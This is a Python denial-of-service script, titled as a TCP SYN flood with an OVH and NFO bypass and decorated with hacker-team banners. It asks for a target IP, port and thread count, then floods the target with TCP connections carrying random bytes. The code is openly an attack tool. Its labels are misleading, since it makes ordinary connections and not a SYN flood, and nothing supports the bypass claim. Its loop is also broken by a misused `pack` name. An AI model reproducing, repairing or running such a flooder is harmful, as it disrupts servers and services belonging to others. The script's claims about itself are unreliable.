# TCP SYN FLOOD (OVH & NFO BYPASS)
import socket, threading
import time
import os,sys
from secrets import choice
from threading import Thread
import psutil
import random

os.system("clear")
print("З А Г Р У З К А....")
time.sleep(1.5)
os.system("clear")
print('''
    KAZUYA AND TEAM
 
╭╮╭━╮
┃┃┃╭╯
┃╰╯╯╭━━┳━━━┳╮╭┳╮╱╭┳━━╮
┃╭╮┃┃╭╮┣━━┃┃┃┃┃┃╱┃┃╭╮┃
┃┃┃╰┫╭╮┃┃━━┫╰╯┃╰━╯┃╭╮┃
╰╯╰━┻╯╰┻━━━┻━━┻━╮╭┻╯╰╯
╱╱╱╱╱╱╱╱╱╱╱╱╱╱╭━╯┃
╱╱╱╱╱╱╱╱╱╱╱╱╱╱╰━━╯
                                
''')
print("Ddos©Attaka©Tpc")

time.sleep(2.5)
os.system("clear")
print()
from concurrent.futures import thread
import random
import socket
from struct import pack
import threading
import os 
import time
print("""
 ▓█████▄  ▒█████    ██████ ▓█████ ██▀███  
 ▒██▀ ██▌▒██▒  ██▒▒██    ▒ ▓█   ▀▓██ ▒ ██▒
 ░██   █▌▒██░  ██▒░ ▓██▄   ▒███  ▓██ ░▄█ ▒
▒░▓█▄   ▌▒██   ██░  ▒   ██▒▒▓█  ▄▒██▀▀█▄  
░░▒████▓ ░ ████▓▒░▒██████▒▒░▒████░██▓ ▒██▒
░ ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░░░ ▒░ ░ ▒▓ ░▒▓░
  ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░   ░ ░    ░▒ ░ ▒░
  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░     ░     ░   ░ 
    ░        ░ ░        ░     ░     ░     
Made by Mr-Cuda
""")
a = str(input(" IP =>"))
b = int(input(" Port =>"))
c = int(input(" Thread =>"))
#target = '10.0.0.138'
target = (a)
port = (b)
thread = (c)
def start():
    s = random._urandom(10)
    x = int(0)
    while True:
        try:
            d =socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            d.connect((target,port))
            d.send(s)
            for i in range(pack):
                d.send(s)
            x += 1
            print(f"ddosing {target} on port {port} allready sent : {x}")
        except:
            d.close()
            print("Done...")
            quit()
            time.sleep(500)
for x in range(thread):
    thread = threading.Thread(target=start)
    thread.start()
